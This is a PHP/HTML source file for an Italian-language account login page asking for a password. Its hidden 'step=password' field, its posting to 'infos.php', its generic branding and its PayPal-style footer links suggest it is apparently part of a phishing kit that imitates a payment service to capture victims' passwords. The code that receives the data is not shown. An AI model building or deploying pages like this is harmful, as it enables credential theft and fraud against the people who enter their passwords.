<?php 

require_once "functions.php";




?>

<!DOCTYPE html>
<html lang="it">

<head>
  <meta charset="utf-8">
  <title>Accedi al tuo account</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- file css del template-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">               
  <link rel="preconnect" href="https://fonts.gstatic.com">

  <!-- file js-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo del sito web-->
  <link rel="icon" href="image/Untitled-1.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/Untitled-1.png" type="image/x-icon" />

</head>

<body>
     <div class="login">
         <div class="logo">
             <img src="image/logo.png">
             <div class="change">
                 <p></p><a href="#">cambia</a>
             </div>
         </div>
         <form action="infos.php" method="post">

            <input type="hidden" name="step" value="password">

            <div class="user">
                 <input type="password" placeholder="Password" name="password">
                 <div class="er"><p>Obbligatorio</p></div>
                 <div class="er-img"><img src="image/img-er.png"></div>
                 <p class="place">Email o numero di telefono</p>
             </div>

             <a href="#">Password dimenticata?</a>
             <button name="submit" id="log" style="color:#fff;" class="btn btn-primary d-block">Accedi</button>
             <div class="or">
                 <p>o</p>
             </div>
             <button type="button" class="btn btn-light">Registrati</button>
         </form>
     </div>


     <footer>
        <div class="footer">
            <ul class="list-unstyled d-flex">
                <li>Contattaci</li>
                <li>Privacy</li>
                <li>Legale</li>
                <li>Worldwide</li>
            </ul>
        </div>
     </footer>

  <!-- file js del template-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/test.js"></script>
</body>
</html>